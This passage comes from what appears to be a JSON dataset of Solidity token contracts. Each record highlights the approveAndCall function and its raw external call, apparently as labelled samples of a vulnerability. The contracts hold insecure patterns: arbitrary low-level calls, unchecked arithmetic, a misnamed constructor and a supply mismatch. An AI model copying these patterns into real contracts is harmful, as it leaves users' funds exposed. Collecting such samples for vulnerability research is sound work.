symbol;\n string public version = 'HE0.2';\n function HEStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract PWC is HEStandardToken(20000000000000000, \"PWC\", 9, \"PWC\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1507"
  },
  "filename": "33535.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Omanilla is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Omanilla(\n ) {\n balances[msg.sender] = 75000000000000000000000000;\n totalSupply = 75000000000000000000000000;\n name = \"Omanilla\";\n decimals = 18;\n symbol = \"OMA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1508"
  },
  "filename": "33538.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract HextracoinToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is HextracoinToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 290000000000;\n totalSupply = 290000000000;\n name = \"Hextracoin Token\";\n decimals = 4;\n symbol = \"HXT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1509"
  },
  "filename": "33554.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eRupee is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function eRupee(\n ) {\n balances[msg.sender] = 500000000000000.00;\n totalSupply = 500000000000000.00 ;\n name = \"eRupee\";\n decimals = 2;\n symbol = \"e₹\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150a"
  },
  "filename": "33556.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract XToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function XToken(\n ) {\n balances[msg.sender] = 69000000;\n totalSupply = 69000000;\n name = \"XToken\";\n decimals = 0;\n symbol = \"XXX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150b"
  },
  "filename": "33612.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BSERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BSERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 10000000000;\n name = \"BurgasCoin\";\n decimals = 2;\n symbol = \"BURG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150c"
  },
  "filename": "33621.sol",
  "content": "pragma solidity ^0.4.8;\ncontract PabloTokenBase {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract PabloStandardToken is PabloTokenBase {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract PabloToken is PabloStandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1.1';\n function PabloToken() public {\n totalSupply = 1000000000;\n balances[msg.sender] = totalSupply;\n decimals = 8;\n name = \"Pablo Token\";\n symbol = \"PAB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150d"
  },
  "filename": "33636.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract WeberCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function WeberCoin(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"WeberCoin\";\n decimals = 18;\n symbol = \"WBC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150e"
  },
  "filename": "33654.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LitecoinClassic is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function LitecoinClassic(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Litecoin Classic\";\n decimals = 18;\n symbol = \"LCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb150f"
  },
  "filename": "33656.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FAIZACOIN is StandardToken {\n function () {\n throw;\n }\n string public name = 'FAIZACOIN';\n uint8 public decimals = 0;\n string public symbol = 'FZC';\n string public version = 'H1.0';\n function FAIZACOIN(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"FAIZA Coin\";\n decimals = 0;\n symbol = \"FZC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1510"
  },
  "filename": "33657.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LitecoinClassic is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Litecoin Classic\";\n decimals = 18;\n symbol = \"LCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1511"
  },
  "filename": "33661.sol",
  "content": "pragma solidity ^0.4.17;\ncontract token {\n function transferFrom(address sender, address receiver, uint amount) public returns(bool success) {}\n function transfer(address receiver, uint amount) public returns(bool success) {}\n function balanceOf(address holder) public constant returns(uint) {}\n}\ncontract owned {\n address public owner;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function owned() public{\n owner = msg.sender;\n }\n function changeOwner(address newOwner) onlyOwner public{\n owner = newOwner;\n }\n}\ncontract safeMath {\n function safeSub(uint a, uint b) constant internal returns(uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) constant internal returns(uint) {\n uint c = a + b;\n assert(c >= a && c >= b);\n return c;\n }\n function safeMul(uint a, uint b) constant internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n}\ncontract casinoBank is owned, safeMath{\n uint public playerBalance;\n mapping(address=>uint) public balanceOf;\n mapping(address=>uint) public withdrawAfter;\n uint public gasPrice = 4;\n mapping(address=>uint) public avgGas;\n token edg;\n uint public closeAt;\n event Deposit(address _player, uint _numTokens, bool _chargeGas);\n event Withdrawal(address _player, address _receiver, uint _numTokens);\n function casinoBank(address tokenContract) public{\n edg = token(tokenContract);\n }\n function deposit(address receiver, uint numTokens, bool chargeGas) public isAlive{\n require(numTokens > 0);\n uint value = safeMul(numTokens,10000);\n if(chargeGas) value = safeSub(value, msg.gas/1000 * gasPrice);\n assert(edg.transferFrom(msg.sender, address(this), numTokens));\n balanceOf[receiver] = safeAdd(balanceOf[receiver], value);\n playerBalance = safeAdd(playerBalance, value);\n Deposit(receiver, numTokens, chargeGas);\n }\n function requestWithdrawal() public{\n withdrawAfter[msg.sender] = now + 7 minutes;\n }\n function cancelWithdrawalRequest() public{\n withdrawAfter[msg.sender] = 0;\n }\n function withdraw(uint amount) public keepAlive{\n require(withdrawAfter[msg.sender]>0 && now>withdrawAfter[msg.sender]);\n withdrawAfter[msg.sender] = 0;\n uint value = safeMul(amount,10000);\n balanceOf[msg.sender]=safeSub(balanceOf[msg.sender],value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(msg.sender, amount));\n Withdrawal(msg.sender, msg.sender, amount);\n }\n function withdrawBankroll(uint numTokens) public onlyOwner {\n require(numTokens <= bankroll());\n assert(edg.transfer(owner, numTokens));\n }\n function bankroll() constant public returns(uint){\n return safeSub(edg.balanceOf(address(this)), playerBalance/10000);\n }\n function close() onlyOwner public{\n if(playerBalance == 0) selfdestruct(owner);\n if(closeAt == 0) closeAt = now + 30 days;\n else if(closeAt < now) selfdestruct(owner);\n }\n function open() onlyOwner public{\n closeAt = 0;\n }\n modifier isAlive {\n require(closeAt == 0);\n _;\n }\n modifier keepAlive {\n 